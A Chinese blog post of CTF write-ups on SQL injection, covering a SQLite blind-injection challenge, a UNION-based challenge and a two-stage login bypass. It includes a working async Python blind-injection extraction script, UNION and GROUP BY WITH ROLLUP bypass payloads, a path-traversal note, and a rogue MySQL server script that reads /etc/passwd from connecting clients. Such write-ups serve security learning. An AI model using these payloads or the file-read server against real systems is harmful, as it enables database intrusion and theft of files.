---
title: "SQL注入相关"
date: 2020-04-05
description: "记录CTF中遇到的SQL注入题型"
categories: [
  "CTF"
]
tags: [
  "SQL注入"
]
---

## [HarekazeCTF2019]Sqlite

首先给出`vote.php`和`schema.sql`

- 提示：

  1. flag位于flag表中
  2. WAF过滤`" % ' * + / < = > \ _ ` ~ -`和SQLite中大部分字符串函数

- 观察查询语句

  ```php
  $pdo = new PDO('sqlite:../db/vote.db');
  $res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
  if ($res === false) {
    die(json_encode(['error' => 'An error occurred while updating database']));
  }
  ```

  语句报错时返回页面不同，考虑盲注

- 查询手册发现，SQLite中 `=`可用`IS`替代，`char`考虑`hex`替代

- 因为`'`被过滤，也无法截取字符串（未找到绕过函数），无法构造字符串进行匹配。查看师傅WP发现可用trim构造十六进制中的所有字母和空串，利用`||`连接，构造hex串对`hex(flag)`进行replace替换，检测hex串长度是否变化

- 使用abs溢出引发报错，利用`case when`进行条件判断

- 出题人给出的脚本在buuoj上速度极慢，改用async重写了并发版本

```python
import binascii
import asyncio
import aiohttp

URL = 'http://5de75701-3b3e-42b4-817f-11f1c7d44743.node3.buuoj.cn/vote.php'
l = 84
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'


res = binascii.hexlify(b'flag{').decode().upper()


async def fetch_len(session, index):
    global l
    async with session.post(URL, data={
        'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<index})when(0)then(0)else(0x8000000000000000)end)'
    }) as resp:
        print(index)
        if 'An error occurred' in await resp.text():
            l |= 1 << index


async def fetch_char(session, url, index, data):
    global res
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + data)
    async with session.post(URL, data={
        'id': f'abs(case((length(replace(hex((select(flag)from(flag))),{t},trim(0,0)))IS({l})))when(1)then(0)else(0x8000000000000000)end)'
    }) as resp:
        if 'An error occurred' in await resp.text():
            res += data
            raise Exception("Done")


async def main():
    async with aiohttp.ClientSession() as session:
        # task = [fetch_len(session, index) for index in range(16)]
        # await asyncio.gather(*task)
        print('[+] length:', l)
        for i in range(len(res), l):
            try:
                task = [fetch_char(session, URL, i, x) for x in '0123456789ABCDEF']
                await asyncio.gather(*task)
            except Exception as e:
                print(e)
            print(f'[+] flag ({i}/{l}): {res}')
        print('[+] flag:', binascii.unhexlify(res).decode())


asyncio.run(main())
```

> SQLite中爆表名可使用`"select sql from sqlite_master where tbl_name=‘table_name’ and type=‘table’ "`

## [b01lers2020]Life on Mars

- 题面十分奇妙，扫扫扫没有扫到泄露，观察逻辑发现请求`query?search=`查询数据，推断SQL注入

- 尝试了传统的各种语句，均返回`1`，结合返回的结果类似`table`，想到SQL语句可能并非常见的`where`形式

- 多次尝试后，发现直接后接`order by`可以回显

  ```sql
  /query?search=utopia_basin order by 1
  ```

  推测是查询语句是`SELECT * FROM search`，直接`union`联合注入

- 常规流程：爆库，爆表，爆字段

- 最终payload：

  ```sql
  /query?search=utopia_basin UNION SELECT 1, code FROM alien_code.code
  ```

## 某入群题

### STAGE1:

- 盲猜SQL注入，fuzz一波

- WAF比较独特，ban掉了圆括号，大多数注入语句都无法使用

  虽然过滤了单引号，但是测试发现可以用`\`转义`username`字段的反引号，实现逃逸。

- 手工测试逻辑，发现可以重复注册相同用户名，有多条记录时会报错。查询逻辑是：先查询`username`和`password`，然后`fetch`验证信息，与传参比对

- 推测注册语句: `insert into xxx values xxx`

  登录语句: `select question, token from xxx where username='xxx' and password='xxx'`

- 测试发现没有盲注和报错，过滤了`'` `union` `select` `0x` `()`，几乎无法使用函数，也无法构造字符串，`like`等模糊匹配也全被ban掉，陷入僵局

- 本地测试发现`0b`类似`0x`，可以作为二进制字符串使用，但是写完脚本发现跑不出来，查资料发现，`mysql8`以下版本，`BIT`串默认作为整数，无法利用

  > 在mysql8之前，bit函数和操作符只是支持64位的整数(bigint)，返回值也是64位的整数(bigint)。所以最大支持到64位。非bigint参数会被转化成bigint，然后参与操作，所以可能会发生截断。

- 重新考虑可控点，现在拥有可以逃逸的`insert`和`select`语句，显然`select`更加易于利用，翻看文档仔细研究`select`的语句结构

  ```mysql
  SELECT
      [ALL | DISTINCT | DISTINCTROW ]
        [HIGH_PRIORITY]
        [STRAIGHT_JOIN]
        [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
        [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
      select_expr [, select_expr ...]
      [FROM table_references
        [PARTITION partition_list]
      [WHERE where_condition]
      [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
      [HAVING where_condition]
      [WINDOW window_name AS (window_spec)
          [, window_name AS (window_spec)] ...]
      [ORDER BY {col_name | expr | position}
        [ASC | DESC], ... [WITH ROLLUP]]
      [LIMIT {[offset,] row_count | row_count OFFSET offset}]
      [INTO OUTFILE 'file_name'
          [CHARACTER SET charset_name]
          export_options
        | INTO DUMPFILE 'file_name'
        | INTO var_name [, var_name]]
      [FOR {UPDATE | SHARE} [OF tbl_name [, tbl_name] ...] [NOWAIT | SKIP LOCKED]
        | LOCK IN SHARE MODE]]
  ```

  一开始查看的是网上的文档，版本较低，发现`group by`存在排序关键字`ASC | DESC`，但是测试后发现只能由主键排序（似乎存在争议，没有深究），还是无法利用

- 仔细研究了所有关键字，发现`group by`的`with rollup`可以构造出NULl值，再用`having`/`limit`，在`token`字段fetch出`NULL`值，即可绕过

- payload:

  ```mysql
  username=\&password= || 1 group by token with rollup limit 2,1; -- &question=1
  ```

### STAGE2:

- 登陆后，研究一波后台功能

- 抓API：

  ```
  http://7f44a6e2-8439-449a-b37e-57be0d53782f.node3.buuoj.cn/admin/page/json.php?dt=alldata&name={filename}&page=1&limit=15
  ```

- 显眼的`X-Powered-By: PHP/5.2.17`，%00截断，路径穿越读取根目录，发现flag位置

- 任意文件读取则是利用备份界面的连接测试功能

  [mysql任意文件读](https://www.cnblogs.com/apossin/p/10127496.html)

- 抄一个exp:

  ```python
  #coding=utf-8 
  import socket
  import logging
  logging.basicConfig(level=logging.DEBUG)
    
  filename="/etc/passwd"
  sv=socket.socket()
  sv.bind(("",3306))
  sv.listen(5)
  conn,address=sv.accept()
  logging.info('Conn from: %r', address)
  conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
  conn.recv(9999)
  logging.info("auth okay")
  conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
  conn.recv(9999)
  logging.info("want file...")
  wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
  conn.sendall(wantfile)
  content=conn.recv(9999)
  logging.info(content)
  conn.close()
  ```

> 踩坑：buuoj靶机的mysql需要修改`/etc/mysql/mysql.conf.d/mysqld.cnf`中的`bind-address`为`0.0.0.0`